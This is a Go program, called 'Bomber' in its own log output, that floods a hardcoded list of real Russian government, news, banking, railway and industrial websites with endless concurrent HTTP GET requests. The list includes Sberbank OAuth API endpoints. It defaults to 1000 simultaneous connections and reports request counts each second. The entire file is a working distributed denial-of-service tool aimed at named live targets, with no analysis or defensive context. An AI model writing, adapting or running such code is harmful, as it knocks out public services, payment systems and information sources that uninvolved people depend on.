package main

import (
	"flag"
	"io"
	"log"
	"math"
	"net/http"
	"runtime"
	"sync/atomic"
	"time"
)

var targets = []string{
	"https://lenta.ru/",
	"https://ria.ru/",
	"https://ria.ru/lenta/",
	"https://www.rbc.ru/",
	"https://www.rt.com/",
	"http://kremlin.ru/",
	"http://en.kremlin.ru/",
	"https://smotrim.ru/",
	"https://tass.ru/",
	"https://tvzvezda.ru/",
	"https://vsoloviev.ru/",
	"https://www.1tv.ru/",
	"https://www.vesti.ru/",
	"https://online.sberbank.ru/",
	"https://sberbank.ru/",
	"https://zakupki.gov.ru/",
	"https://www.gosuslugi.ru/",
	"https://er.ru/",
	"https://www.rzd.ru/",
	"https://rzdlog.ru/",
	"https://vgtrk.ru/",
	"https://www.interfax.ru/",
	"https://www.mos.ru/uslugi/",
	"http://government.ru/",
	"https://mil.ru/",
	"https://www.nalog.gov.ru/",
	"https://customs.gov.ru/",
	"https://pfr.gov.ru/",
	"https://rkn.gov.ru/",
	"https://www.gazprombank.ru/",
	"https://www.vtb.ru/",
	"https://www.gazprom.ru/",
	"https://lukoil.ru",
	"https://magnit.ru/",
	"https://www.nornickel.com/",
	"https://www.surgutneftegas.ru/",
	"https://www.tatneft.ru/",
	"https://www.evraz.com/ru/",
	"https://nlmk.com/",
	"https://www.sibur.ru/",
	"https://www.severstal.com/",
	"https://www.metalloinvest.com/",
	"https://nangs.org/",
	"https://rmk-group.ru/ru/",
	"https://www.tmk-group.ru/",
	"https://ya.ru/",
	"https://www.polymetalinternational.com/ru/",
	"https://www.uralkali.com/ru/",
	"https://www.eurosib.ru/",
	"https://omk.ru/",
	"https://mail.rkn.gov.ru/",
	"https://cloud.rkn.gov.ru/",
	"https://mvd.gov.ru/",
	"https://pwd.wto.economy.gov.ru/",
	"https://stroi.gov.ru/",
	"https://proverki.gov.ru/",
	"https://www.gazeta.ru/",
	"https://www.crimea.kp.ru/",
	"https://www.kommersant.ru/",
	"https://riafan.ru/",
	"https://www.mk.ru/",
	"https://api.sberbank.ru/prod/tokens/v2/oauth",
	"https://api.sberbank.ru/prod/tokens/v2/oidc",
}

var queriesTotal uint64
var queriesSuccess uint64

func bomber(timeout, slider int) {
	client := http.Client{
		Timeout: time.Duration(timeout) * time.Second,
	}

	for {
		resp, err := client.Get(targets[slider])
		if err == nil {
			_, err = io.ReadAll(resp.Body)
			resp.Body.Close()
		}

		if err == nil && resp.StatusCode/100 == 2 {
			atomic.AddUint64(&queriesSuccess, 1)
		}

		atomic.AddUint64(&queriesTotal, 1)
		if slider++; slider >= len(targets) {
			slider = 0
		}
	}
}

func main() {
	reqs := flag.Int("connections", 1000, "number of simultaneous requests")
	timeout := flag.Int("timeout", 1, "HTTP connection timeout (in seconds)")
	cores := flag.Int("cores", runtime.NumCPU(), "number of CPU cores to use")
	flag.Parse()

	if *reqs < 1 {
		log.Fatal("invalid connection count, must be > 0")
	}

	if *timeout < 1 {
		log.Fatal("invalid timeout, must be > 0")
	}

	if *cores < 1 {
		log.Fatal("invalid core count, must be > 0")
	}

	runtime.GOMAXPROCS(*cores)

	log.Printf("Bomber starts with the following configuration:")
	log.Printf("  cores: %d\n", *cores)
	log.Printf("  HTTP timeout: %d\n", *timeout)
	log.Printf("  Concurrent requests: %d\n", *reqs)

	for i := 0; i < *reqs; i++ {
		go bomber(*timeout, i%len(targets))
	}

	success := uint64(0)
	for {
		total := atomic.LoadUint64(&queriesTotal)
		nsuccess := atomic.LoadUint64(&queriesSuccess)

		var diff uint64
		if nsuccess < success {
			diff = math.MaxUint64 - success + nsuccess
		} else {
			diff = nsuccess - success
		}

		log.Printf("Request: %d, successful: %d (+%d)\n", total, nsuccess, diff)
		time.Sleep(1 * time.Second)
		success = nsuccess
	}
}
